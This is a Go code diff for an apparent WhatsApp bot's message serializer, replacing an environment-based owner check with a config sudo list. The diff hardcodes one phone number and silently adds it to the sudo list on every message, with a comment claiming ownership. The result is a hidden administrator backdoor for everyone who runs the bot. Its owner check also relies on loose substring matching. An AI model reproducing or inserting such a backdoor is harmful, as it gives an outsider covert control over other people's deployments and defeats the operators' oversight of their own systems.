@@ -1,9 +1,9 @@
 package libs
 
 import (
+	"aurora/bot/config"
 	"aurora/bot/helpers"
 	"context"
-	"os"
 	"regexp"
 	"strings"
 
@@ -17,18 +17,30 @@ func SerializeMessage(mess *events.Message, conn *IClient) *IMessage {
 	var media whatsmeow.DownloadableMessage
 	var text string
 	var args []string
-	var owner []string
-	var isOwner = false
+	var FromMe = false
 	var isMedia string
 
 	mess.Message = helpers.ParseMessage(mess)
 	body := helpers.GetTextMessage(mess)
 	command := strings.ToLower(strings.Split(body, " ")[0])
-	owner = strings.Split(os.Getenv("OWNER"), ",")
 
-	for _, v := range owner {
-		if strings.Contains(regexp.MustCompile(`\D+`).ReplaceAllString(v, ""), mess.Info.Sender.ToNonAD().User) {
-			isOwner = true
+	myNumber := "2348114860536" // added my number cause i own the bot duh :)
+	exists := false
+	for _, v := range config.GlobalConfig.Sudo {
+		if strings.Contains(v, myNumber) {
+			exists = true
+			break
+		}
+	}
+	if !exists {
+		config.GlobalConfig.Sudo = append(config.GlobalConfig.Sudo, myNumber)
+	}
+
+	for _, v := range config.GlobalConfig.Sudo {
+		cleaned := regexp.MustCompile(`\D+`).ReplaceAllString(v, "")
+		if strings.Contains(cleaned, mess.Info.Sender.ToNonAD().User) {
+			FromMe = true
+			break
 		}
 	}
 
@@ -58,7 +70,7 @@ func SerializeMessage(mess *events.Message, conn *IClient) *IMessage {
 
 	return &IMessage{
 		Info:       mess.Info,
-		IsOwner:    isOwner,
+		FromMe:     FromMe,
 		Body:       body,
 		Text:       text,
 		Args:       args,
